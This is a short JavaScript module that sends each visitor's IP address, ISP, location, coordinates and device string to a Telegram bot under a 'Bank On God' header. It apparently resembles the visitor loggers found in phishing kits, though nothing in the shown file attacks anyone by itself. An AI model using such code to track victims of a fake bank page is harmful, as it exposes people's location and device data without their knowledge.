// telegramNotify.js

import { BOT_TOKEN, CHAT_ID } from './telegramConfig.js';

export async function notifyTelegram(ip, geo, userAgent) {
  const now = new Date().toISOString().replace("T", " ").slice(0, 19) + " UTC";
  const text = `💰 Bank On God
=========================
IP: ${ip}
ISP: ${geo.isp}
Location: ${geo.city}, ${geo.region}, ${geo.country}
Coordinates: ${geo.coords}
Device: ${userAgent}
Time: ${now}`;

  console.log("Sending Telegram message:", text); // Debug

  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    });

    const result = await res.json();
    console.log("Telegram response:", result);
  } catch (err) {
    console.warn("Telegram notify failed:", err);
  }
}
